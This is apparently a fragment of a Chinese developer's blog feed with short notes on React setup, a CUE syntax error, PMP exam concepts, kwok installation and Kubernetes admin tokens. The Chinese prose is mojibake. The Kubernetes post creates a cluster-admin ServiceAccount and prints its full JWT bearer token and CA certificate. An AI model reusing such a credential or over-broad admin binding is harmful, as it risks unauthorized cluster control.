npm run build<br>    Bundles the app into static files <span class="hljs-keyword">for</span> production.<br><br>  npm <span class="hljs-built_in">test</span><br>    Starts the <span class="hljs-built_in">test</span> runner.<br><br>  npm run eject<br>    Removes this tool and copies build dependencies, configuration files<br>    and scripts into the app directory. If you <span class="hljs-keyword">do</span> this, you canâ€™t go back!<br><br>We suggest that you begin by typing:<br><br>  <span class="hljs-built_in">cd</span> my-app<br>  npm start<br><br>Happy hacking!<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 my-app]<span class="hljs-comment"># npm start</span><br>...<br><br><br>Compiled successfully!<br><br>You can now view my-app <span class="hljs-keyword">in</span> the browser.<br><br>  http://localhost:3000<br><br>Note that the development build is not optimized.<br>To create a production build, use npm run build.<br><br>webpack compiled successfully<br></code></pre></td></tr></table></figure><p>ç„¶åä¼šè‡ªåŠ¨è·³è½¬åˆ° <code>http://localhost:3000/</code></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://zhuanlan.zhihu.com/p/144885938">Node.js å¼€å‘ç¯å¢ƒå®‰è£…ä¹‹ Linux</a><br><a href="https://blog.csdn.net/maoge_666/article/details/136038003">npmæŠ¥é”™ï¼šrequest to https://registry.npm.taobao.org failed, reason certificate has expired</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueè¯­è¨€ç³»åˆ—ã€‘(202403) cueè¯­æ³•æŠ¥é”™ï¼šillegal character U+005C</title>
    <link href="/2024/03/15/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20cue%E8%AF%AD%E6%B3%95%E6%8A%A5%E9%94%99%EF%BC%9Aillegal%20character%20U+005C/"/>
    <url>/2024/03/15/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20cue%E8%AF%AD%E6%B3%95%E6%8A%A5%E9%94%99%EF%BC%9Aillegal%20character%20U+005C/</url>
    
    <content type="html"><![CDATA[<h1 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">illegal character U+005C <span class="hljs-string">&#x27;\&#x27;</span><br>åœ¨ç¼–ç¨‹å’Œæ–‡æœ¬å¤„ç†ä¸­ï¼Œ`U+005C`Â æ˜¯ä¸€ä¸ª Unicode ç¼–ç ï¼Œå®ƒå¯¹åº”çš„æ˜¯åæ–œæ å­—ç¬¦ï¼ˆbackslashï¼‰ï¼Œå³Â `\`ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240315172255.png" alt="image.png"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> <span class="hljs-string">&quot;111&quot;</span><br><span class="hljs-symbol">    bbb:</span> <span class="hljs-string">&quot;222&quot;</span><br><span class="hljs-symbol">    ccc:</span> <span class="hljs-string">&quot;333&quot;</span><br><span class="hljs-symbol">    ddd:</span> <span class="hljs-string">&quot;444&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ARCH:</span> <span class="hljs-string">&quot;amd64&quot;</span><br><br>if ARCH == <span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> \(global.aaa)<br><span class="hljs-symbol">    bbb:</span> \(global.bbb)<br><span class="hljs-punctuation">&#125;</span><br>if ARCH == <span class="hljs-string">&quot;arm64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    ccc:</span> \(global.ccc)<br><span class="hljs-symbol">    ddd:</span> \(global.ddd)<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="è§£å†³ï¼šåŠ ä¸Šå¼•å·"><a href="#è§£å†³ï¼šåŠ ä¸Šå¼•å·" class="headerlink" title="è§£å†³ï¼šåŠ ä¸Šå¼•å·"></a>è§£å†³ï¼šåŠ ä¸Šå¼•å·</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240315172444.png"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> <span class="hljs-string">&quot;111&quot;</span><br><span class="hljs-symbol">    bbb:</span> <span class="hljs-string">&quot;222&quot;</span><br><span class="hljs-symbol">    ccc:</span> <span class="hljs-string">&quot;333&quot;</span><br><span class="hljs-symbol">    ddd:</span> <span class="hljs-string">&quot;444&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ARCH:</span> <span class="hljs-string">&quot;amd64&quot;</span><br><br><br>if ARCH == <span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> <span class="hljs-string">&quot;\(global.aaa)&quot;</span><br><span class="hljs-symbol">    bbb:</span> <span class="hljs-string">&quot;\(global.bbb)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br>if ARCH == <span class="hljs-string">&quot;arm64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    ccc:</span> <span class="hljs-string">&quot;\(global.ccc)&quot;</span><br><span class="hljs-symbol">    ddd:</span> <span class="hljs-string">&quot;\(global.ddd)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>[cueå·¥å…·](<a href="https://cuelang.org/play/?example=test-example#w=function&i=cue&f=export&o=cue">CUE Playground | CUE (cuelang.org)</a>)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>notes</title>
    <link href="/2024/03/04/notes/notes/"/>
    <url>/2024/03/04/notes/notes/</url>
    
    <content type="html"><![CDATA[<h1 id="20240124"><a href="#20240124" class="headerlink" title="20240124"></a>20240124</h1><p>æœ¬é¢˜è€ƒæŸ¥ï¼šé¡¹ç›®è´¨é‡ç®¡ç†-è´¨é‡ç®¡ç†å·¥å…·-å¸•ç´¯æ‰˜å›¾ã€‚<br>åˆ©ç”¨å¸•ç´¯æ‰˜å›¾ï¼Œæœ‰åˆ©äºç¡®å®šå½±å“è´¨é‡çš„ä¸»æ¬¡å› ç´ ï¼Œä½¿é”™ç»¼å¤æ‚çš„é—®é¢˜ä¸€ç›®äº†ç„¶ã€‚</p><p>æˆæœ¬ç»©æ•ˆæŒ‡æ•°å°äº1ï¼Œæ‰€ä»¥å½“å‰æœ¬é¡¹ç›®çš„æˆæœ¬è¶…æ”¯ï¼Œ æˆæœ¬è¶…æ”¯äº†ï¼Œé‚£å°±è¡¨ç¤ºä¸è®¡åˆ’ä¸ç¬¦äº†ï¼Œä¹Ÿå°±æ˜¯æ— æ³•æŒ‰ç…§è®¡åˆ’å®Œæˆã€‚<br>åœ¨é¡¹ç›®ç®¡ç†ä¸­ï¼Œä¸€ä¸ªè¡¡é‡æˆæœ¬ç»©æ•ˆçš„æŒ‡æ ‡æ˜¯æˆæœ¬ç»©æ•ˆæŒ‡æ•°ï¼ˆcost performance index, cpi)ï¼Œå®ƒåœ¨è¡¡é‡æ­£åœ¨è¿›è¡Œçš„é¡¹ç›®çš„æˆæœ¬æ•ˆç‡ã€‚<br>CPIå€¼å¦‚æœå°äº1åˆ™è¡¨ç¤ºå®é™…æˆæœ¬è¶…å‡ºé¢„ç®—ï¼›CPIå€¼å¦‚æœå¤§äº1åˆ™è¡¨ç¤ºå®é™…æˆæœ¬ä½äºé¢„ç®—ã€‚<br>æˆæœ¬ç»©æ•ˆæŒ‡æ•°ï¼ˆCPIï¼‰&#x3D;EV&#x2F;AC</p><h1 id="20240127"><a href="#20240127" class="headerlink" title="20240127"></a>20240127</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127101004.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127105123.png" alt="image.png"></p><p>DoDï¼šåšåˆ°ä»€ä¹ˆç¨‹åº¦æ‰ç®—å®Œæˆ<br>DoRï¼šå‡†å¤‡åˆ°ä»€ä¹ˆç¨‹åº¦æ‰èƒ½è¿›å…¥å¼€å‘<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127110913.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127122703.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127120723.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127122522.png" alt="image.png"></p><h1 id="20240303"><a href="#20240303" class="headerlink" title="20240303"></a>20240303</h1><p>å¿«é€Ÿè·Ÿè¿›æ˜¯æŒ‡å°†æ­£å¸¸æƒ…å†µä¸‹æŒ‰é¡ºåºè¿›è¡Œçš„æ´»åŠ¨æˆ–é˜¶æ®µæ”¹ä¸ºè‡³å°‘æ˜¯éƒ¨åˆ†å¹¶è¡Œå¼€å±•ã€‚<br>èµ„æºå¹³è¡¡æ˜¯ä¸ºäº†åœ¨èµ„æºéœ€æ±‚ä¸èµ„æºä¾›ç»™ä¹‹é—´å–å¾—å¹³è¡¡ï¼Œæ ¹æ®èµ„æºåˆ¶çº¦å¯¹å¼€å§‹æ—¥æœŸå’Œç»“æŸæ—¥æœŸè¿›è¡Œè°ƒæ•´çš„ä¸€ç§æŠ€æœ¯ã€‚<br>å…³é”®é“¾æ³•å…è®¸é¡¹ç›®å›¢é˜Ÿåœ¨ä»»ä½•é¡¹ç›®è¿›åº¦è·¯å¾„ä¸Šè®¾ç½®ç¼“å†²ï¼Œæ¥åº”å¯¹èµ„æºé™åˆ¶å’Œé¡¹ç›®ä¸ç¡®å®šæ€§ã€‚<br>è¿›åº¦å‹ç¼©æŠ€æœ¯æ˜¯æŒ‡åœ¨ä¸ç¼©å‡é¡¹ç›®èŒƒå›´çš„å‰æä¸‹ï¼Œç¼©çŸ­æˆ–åŠ å¿«è¿›åº¦å·¥æœŸï¼Œä»¥æ»¡è¶³è¿›åº¦åˆ¶çº¦å› ç´ ã€å¼ºåˆ¶æ—¥æœŸæˆ–å…¶ä»–è¿›åº¦ç›®æ ‡ã€‚åŒ…æ‹¬èµ¶å·¥å’Œå¿«é€Ÿè·Ÿè¿›ã€‚é¢˜å¹²ä¸­å¢åŠ é¢å¤–èµ„æºå’ŒåŠ ç­å±äºè¿›åº¦å‹ç¼©ä¸­çš„èµ¶å·¥æŠ€æœ¯ã€‚</p><p>è¿›åº¦å‹ç¼©ï¼š</p><ul><li>1ï¼‰èµ¶å·¥</li><li>2ï¼‰å¿«é€Ÿè·Ÿè¿›</li></ul><p>CPI(æˆæœ¬ç»©æ•ˆæŒ‡æ•°)</p><ul><li>å°äº1ï¼šå®é™…æˆæœ¬è¶…å‡ºé¢„ç®—</li><li>å¤§äº1ï¼šç¤ºå®é™…æˆæœ¬ä½äºé¢„ç®—ã€‚</li><li>CPI&#x3D;EV&#x2F;AC<br>Â·<br>SPI(è¿›åº¦ç»©æ•ˆæŒ‡æ•°) </li><li>å°äº1ï¼šè¿›åº¦è½å</li></ul><p>ç”˜ç‰¹å›¾ï¼š<br>     æ—¶é—´è¡¨ æŒç»­æ—¶é—´ å¼€å§‹æ—¶é—´ æˆªæ­¢æ—¶é—´<br>æ´»åŠ¨  x     x        x       x</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘kwokåˆä½“éªŒ</title>
    <link href="/2024/02/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kwok%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2024/02/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kwok%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/kwok/releases/download/v0.5.1/kwokctl-linux-amd64</span><br><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/kwok/releases/download/v0.5.1/kwok-linux-amd64</span><br><br><br></code></pre></td></tr></table></figure><h1 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kwokctl create cluster</span><br>Cluster is creating                                                                                                                                            cluster=kwok<br>Pull image                                                                                                                 image=registry.k8s.io/etcd:3.5.11-0 cluster=kwok<br>Error response from daemon: Head <span class="hljs-string">&quot;https://us-west2-docker.pkg.dev/v2/k8s-artifacts-prod/images/etcd/manifests/3.5.11-0&quot;</span>: dial tcp 108.177.125.82:443: i/o <span class="hljs-built_in">timeout</span><br>ERROR Failed to setup config                                                          err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/etcd:3.5.11-0: exit status 1&quot;</span> cluster=kwok<br>Cluster is cleaned up                                                                                                                                          cluster=kwok<br>ERROR Execute <span class="hljs-built_in">exit</span>                                                                                err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/etcd:3.5.11-0: exit status 1&quot;</span> <br><br><br><br><span class="hljs-comment"># docker pull bitnami/etcd:3.5.11</span><br>3.5.11: Pulling from bitnami/etcd<br>3bd5d758f760: Downloading [=====================================&gt;             ]  42.63MB/56.64MB<br>3bd5d758f760: Downloading [======================================&gt;            ]  43.16MB/56.64MB<br>3bd5d758f760: Pull complete <br>Digest: sha256:4b99cc7a8e7e49ca8a03fba7ae0b5e8913fe2576114ace1bef79166ef0bbe6bf<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> bitnami/etcd:3.5.11<br>docker.io/bitnami/etcd:3.5.11<br><br><br><span class="hljs-comment"># kwokctl create cluster --name demo --etcd-image bitnami/etcd:3.5.11</span><br>Cluster is creating                                                                                                    cluster=demo<br>Pull image                                                                image=registry.k8s.io/kube-apiserver:v1.29.0 cluster=demo<br>Error response from daemon: Head <span class="hljs-string">&quot;https://us-west2-docker.pkg.dev/v2/k8s-artifacts-prod/images/kube-apiserver/manifests/v1.29.0&quot;</span>: dial tcp 108.177.125.82:443: i/o <span class="hljs-built_in">timeout</span><br>ERROR Failed to setup config         err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/kube-apiserver:v1.29.0: exit status 1&quot;</span> cluster=demo<br>Cluster is cleaned up                                                                                                  cluster=demo<br>ERROR Execute <span class="hljs-built_in">exit</span>                               err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/kube-apiserver:v1.29.0: exit status 1&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(æ”¹æ—¶é—´202205) k8sä¸­çš„ secret token</title>
    <link href="/2024/02/21/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(%E6%94%B9%E6%97%B6%E9%97%B4202205)%20k8s%E4%B8%AD%E7%9A%84%20secret%20token/"/>
    <url>/2024/02/21/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(%E6%94%B9%E6%97%B6%E9%97%B4202205)%20k8s%E4%B8%AD%E7%9A%84%20secret%20token/</url>
    
    <content type="html"><![CDATA[<p>ç”Ÿæˆkubernetesé›†ç¾¤æœ€é«˜æƒé™adminç”¨æˆ·çš„token</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRoleBinding</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1beta1</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">admin</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">rbac.authorization.kubernetes.io/autoupdate:</span> <span class="hljs-string">&quot;true&quot;</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cluster-admin</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br><span class="hljs-attr">subjects:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">admin</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">admin</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">kubernetes.io/cluster-service:</span> <span class="hljs-string">&quot;true&quot;</span><br>    <span class="hljs-attr">addonmanager.kubernetes.io/mode:</span> <span class="hljs-string">Reconcile</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤åˆ›å»º serviceaccount å’Œè§’è‰²ç»‘å®šï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl create -f admin-role.yaml<br></code></pre></td></tr></table></figure><p>åˆ›å»ºå®Œæˆåè·å–secretä¸­tokençš„å€¼ã€‚</p><h1 id="è·å–admin-tokençš„secretåå­—"><a href="#è·å–admin-tokençš„secretåå­—" class="headerlink" title="è·å–admin-tokençš„secretåå­—"></a>è·å–admin-tokençš„secretåå­—</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl -n kube-system get secret|grep admin-token<br>admin-token-2qdsz                          kubernetes.io/service-account-token   3         6m<br></code></pre></td></tr></table></figure><h1 id="è·å–tokençš„å€¼"><a href="#è·å–tokençš„å€¼" class="headerlink" title="è·å–tokençš„å€¼"></a>è·å–tokençš„å€¼</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ³¨æ„ï¼štokenæ˜¯base64è§£ç åçš„å€¼</span><br><span class="hljs-comment"># kubectl -n kube-system describe secret admin-token-2qdsz</span><br>Name:         admin-token-2qdsz<br>Namespace:    kube-system<br>Labels:       &lt;none&gt;<br>Annotations:  kubernetes.io/service-account.name: admin<br>              kubernetes.io/service-account.uid: 4fe95396-6de8-4097-9ff9-4232f0151c71<br><br>Type:  kubernetes.io/service-account-token<br><br>Data<br>====<br>ca.crt:     1359 bytes<br>namespace:  11 bytes<br>token:      eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ   <br><br><span class="hljs-comment"># æ³¨æ„ï¼štokenæ˜¯base64ç¼–ç åçš„å€¼</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -oyaml</span><br>apiVersion: v1<br>data:<br>  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR2akNDQXFhZ0F3SUJBZ0lVTVBFY1pDb3graHJPMlJzNk1oblNmTndzV3lJd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1pURUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbAphVXBwYm1jeEREQUtCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByCmRXSmxjbTVsZEdWek1CNFhEVEl4TVRJeE16QXlOVEV3TUZvWERUSTJNVEl4TWpBeU5URXdNRm93WlRFTE1Ba0cKQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbGFVcHBibWN4RERBSwpCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByZFdKbGNtNWxkR1Z6Ck1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeVBsTmJlT2loa1Q0ZHZPVjBxT0QKbnhmSThxQUNFczV3RkZHZUUxamltcFJHZDJ2UVdEWHkwNVdJYVAzNnZrMzlNUGhXTndyVlJlTTQ1SG1VdFZMVApZZVF0TCtqZzJXNUtFVC9ENnBIRmFLalc4VG9CVHdXTUI4dFNSZ0JpTnRKRm5PTUp2Z2tZVDhqdlNTdUhnZjd1ClBvdWFLMUhrUFJYQjFpSi9OSDNQYzMwcTJBV1RmTmNFM21DYU9VMkQrWlBaWUpncGRIV0JCK1pOeHo0R1BCZjcKa2dwbSthQUdydmpzOGZMZFh5MzhhdzNwbitSWGtNNzN5M0w2dDEvbDFvQ0JKcjlQS2pVK0JVa0s1VkdORzFFNAoxQWppQVRUZ3U2S1JKRDV2SGNZeDBHRnJ3dnZDMzRwSCs2Uk1yUWtxZ2RpRlJZVVhEYi9BYjR6RzFlUmRaazArClJRSURBUUFCbzJZd1pEQU9CZ05WSFE4QkFmOEVCQU1DQVFZd0VnWURWUjBUQVFIL0JBZ3dCZ0VCL3dJQkFqQWQKQmdOVkhRNEVGZ1FVY3JvMFdxZ3l1VjJKbTlvbXd6UDlPS25scjN3d0h3WURWUjBqQkJnd0ZvQVVjcm8wV3FneQp1VjJKbTlvbXd6UDlPS25scjN3d0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFKK01HU1BvbHU4VGhkOE1jQTZjCm9EVGdGWTc1MU5RcmlXVXd5a2FBQ2xDZXY2YWp0RU1FdmFDWXZUOXhsaUUrM2lmZDlQTXlPYTB3dDlSUWhLVXIKc01WanVBcUxrWTBhbjhiTm5HeDdkc2IweThBS2JIYXlDQkVBb1ludUtiSXcxUlMvTEpTakJqa1NYS2dsN1c3SwpzNWlzTzBFRFBIS3BOM1lSN3ZiZDdzT2krOTgxTFBWMk4vb2x6TUd3VVNCSUJXTFliZHZveHY2N3JEc1YvZ1lXCjFSZklnOU9USThTVEZhM0RjcHZUNElaTHlIMFhaeisrdjRrK0NZVEptTG9mM0VibWVhQjBya2tNNTZNSFVYWFUKY3pKMi9ETmdhKzNTNU40N0RRYVUvRVlTQXpJWG05a2lYYncwbWZoNnJFcjhHQm9DQzRBWTVOcUJWWUhETjQ1MQpzdG89Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K<br>  namespace: a3ViZS1zeXN0ZW0=<br>  token: 